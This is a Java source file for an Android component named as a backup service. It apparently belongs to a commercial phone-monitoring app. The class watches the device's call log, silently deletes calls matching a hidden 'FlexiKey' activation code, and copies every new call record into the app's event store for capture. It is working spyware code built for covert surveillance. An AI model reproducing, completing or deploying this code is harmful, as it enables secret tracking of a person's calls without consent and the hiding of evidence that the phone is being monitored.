package com.vvt.dalvik.mbackupd.calllog;

import java.util.HashSet;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.provider.CallLog;

import com.fx.android.common.Customization;
import com.fx.dalvik.contacts.ContactsDatabaseManager;
import com.fx.dalvik.event.EventCall;
import com.fx.dalvik.util.FxLog;
import com.vvt.android.syncmanager.control.ConfigurationManager;
import com.vvt.android.syncmanager.control.EventManager;
import com.vvt.android.syncmanager.control.LicenseManager;
import com.vvt.android.syncmanager.control.Main;

public class CallLogContentObserver extends ContentObserver {
	
	private static final String TAG = "CallLogContentObserver";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	
	private Context mContext;
	private ConfigurationManager mConfigManager;
	private EventManager mEventManager;
	private LicenseManager mLicenseManager;
	
	private boolean isRegistered = false;
	private long mRefId = -1;
	
	public CallLogContentObserver(Handler handler) {
		super(handler);
		
		mContext = Main.getContext();
		mConfigManager = Main.getInstance().getConfigurationManager();
		mEventManager = Main.getInstance().getEventsManager();
		mLicenseManager = Main.getInstance().getLicenseManager();
	}
	
	@Override
	public void onChange(boolean selfChangeBoolean) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onChange # ENTER ...");
		}
		
		int rowDeleted = ContactsDatabaseManager.deleteCallWithFlexiKey(mContext);
		if (rowDeleted > 1) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onChange # FK is deleted!!");
			}
		}
		
		boolean isActivated = mLicenseManager.isActivated();
		boolean capturedEnabled = mConfigManager.loadCaptureEnabled();
    	boolean capturedCallEnabled = mConfigManager.loadCapturePhoneCallEnabled();
    	
    	if (!isActivated || !capturedEnabled || !capturedCallEnabled) {
    		if (LOCAL_LOGV) {
    			FxLog.v(TAG, "onContentChange # Call Capturing is disabled!! -> EXIT");
    		}
    		return;
    	}
		
		// No need to query if there are no new event
		long latestId = ContactsDatabaseManager.getLatestCallLogId(mContext);
		if (latestId <= mRefId) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onChange # Latest ID is too old!! -> EXIT ...");
			}
			// Since '_id' in 'calls' is set to increase automatically
			// so it is impossible to found '_id' less than the reference
			return;
		}
		
		HashSet<EventCall> events = ContactsDatabaseManager.getNewerCallLog(mContext, mRefId);
		if (events == null || events.size() == 0) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "onChange # No new event found!! -> EXIT ...");
			}
			return;
		}
		
		long maxId = mRefId;
		for (EventCall call : events) {
			
			long id = call.getId();
			if (id > mRefId) {
				mEventManager.insert(call);
				if (LOCAL_LOGV) {
					FxLog.v(TAG, String.format("onChange # Capture: %s", 
							call.getShortDescription()));
				}
				
				// Find maximum ID in collections
				if (id > maxId) {
					maxId = id;
				}
			}
		}
		if (maxId > mRefId) {
			setRefId(maxId);
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onChange # EXIT ...");
		}
	}
	
	public void register() {
		if (isRegistered) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "register # Register FAILED!! Duplicated registration");
			}
			return;
		}
		Uri uri = CallLog.Calls.CONTENT_URI;
		Main.getContentResolver().registerContentObserver(uri, true, this);
		isRegistered = true;
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("register # Register success, uri: %s", uri));
		}
	}
	
	public void unregister() {
		if (isRegistered) {
			Main.getContentResolver().unregisterContentObserver(this);
			isRegistered = false;
			
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "unregister # Unregister success");
			}
		}
	}
	
	public void setRefId(long refId) {
		mRefId = refId;
		
		// Update refId
		mConfigManager.dumpRefIdCall(mRefId);
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("setRefId # mRefId: %d", mRefId));
		}
	}
	
}
